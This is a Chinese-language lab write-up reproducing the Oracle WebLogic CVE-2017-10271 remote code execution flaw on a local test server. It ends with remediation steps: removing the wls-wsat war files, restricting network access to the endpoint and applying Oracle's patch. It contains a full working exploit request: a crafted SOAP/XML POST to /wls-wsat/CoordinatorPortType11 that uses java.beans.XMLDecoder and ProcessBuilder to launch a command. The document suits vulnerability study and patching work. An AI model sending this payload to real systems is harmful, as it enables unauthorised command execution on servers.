# Weblogic(CVE-2017-10271)漏洞复现

> Oracle Fusion Middleware（Oracle融合中间件）是美国甲骨文（Oracle）公司的一套面向企业和云环境的业务创新平台。该平台提供了中间件、软件集合等功能。Oracle WebLogic Server是其中的一个适用于云环境和传统环境的应用服务器组件。
>
> Oracle WebLogic Server组件的WLS Security子组件存在安全漏洞。使用精心构造的xml数据可能造成任意代码执行，攻击者只需要发送精心构造的 HTTP 请求，就可以拿到目标服务器的权限，可以进行远程命令执行的攻击。

## 影响范围

- Oracle WebLogic Server 10.3.6.0.0版本
- Oracle WebLogic Server 12.1.3.0.0版本
- Oracle WebLogic Server 12.2.1.1.0版本

## 参考链接

- weblogic安装环境以及配置：https://blog.csdn.net/acmman/article/details/70093877
- 漏洞复现参考：https://www.jianshu.com/p/75c92754b34c

## 配置完成

- 配置完成会看到以下7001端口开放以及running的字段字样

![1556458864011](https://github.com/sunSUNQ/Java_learning/raw/master/image/1556458864011.png)

- 查看weblogic server的前端页面

![1556458830499](https://github.com/sunSUNQ/Java_learning/raw/master/image/1556458830499.png)



## 漏洞复现

- 找到存在漏洞的页面（192.168.189.1:7001/wls-wsat/CoordinatorPortType11）

![1556459270195](https://github.com/sunSUNQ/Java_learning/raw/master/image/1556459270195.png)

- 打开burpsuits然后刷新页面截取请求。

![1557198387511](https://github.com/sunSUNQ/Java_learning/raw/master/image/1557198387511.png)

- 将请求内容篡改，然后提交。就会看到浏览器执行了js代码，弹出了计算器。

![1556459795009](https://github.com/sunSUNQ/Java_learning/raw/master/image/1556459795009.png)



## 请求的主要内容

- 主要更改的部分是将GET请求更改为POST请求，然后将Upgrade-Insecure-Requests字段改为1，Content-type字段设置为text/xml，在后边加上shellcode的代码。

```
POST /wls-wsat/CoordinatorPortType11 HTTP/1.1
Host: 192.168.189.1:7001
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9,en;q=0.8
Cookie: ADMINCONSOLESESSION=ngtkLFCAykF1SWUVN9KHhdnDoBS-sX6kGc6SjEaB-fQaV6C83nu3!-1160453256
Connection: close
Content-type: text/xml
Content-Length: 482

<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/"> 
	<soapenv:Header> 
		<work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/"> 
			<java version="1.6.0" class="java.beans.XMLDecoder">
				<object class="java.lang.ProcessBuilder">  
					<array class="java.lang.String" length="1">  
						<void index="0"> 
							<string>calc</string>  
						</void> 
					</array>
					<void method="start"/>  
				</object> 
			</java>
		</work:WorkContext> 
	</soapenv:Header> 
	<soapenv:Body/> 
</soapenv:Envelope>
```



## 漏洞修复建议

- 删除war包。根据实际环境路径和业务需求，删除WebLogic程序下列war包及目录。代码示例如下。

```
rm -f /home/WebLogic/Oracle/Middleware/wlserver_10.3/server/lib/wls-wsat.war
rm -f /home/WebLogic/Oracle/Middleware/user_projects/domains/base_domain/servers/AdminServer/tmp/.internal/wls-wsat.war
rm -rf /home/WebLogic/Oracle/Middleware/user_projects/domains/base_domain/servers/AdminServer/tmp/_WL_internal/wls-wsat
```

- 设置网络访问控制。配置 `http://ip_address:7001/wls-wsat` 的网络访问控制策略，禁止外网直接访问。
- 更新补丁。更新Oracle官方发布的相关补丁，下载链接为：http://www.oracle.com/technetwork/security-advisory/cpuoct2017-3236626.html
- 参考链接：https://helpcdn.aliyun.com/knowledge_detail/64233.html
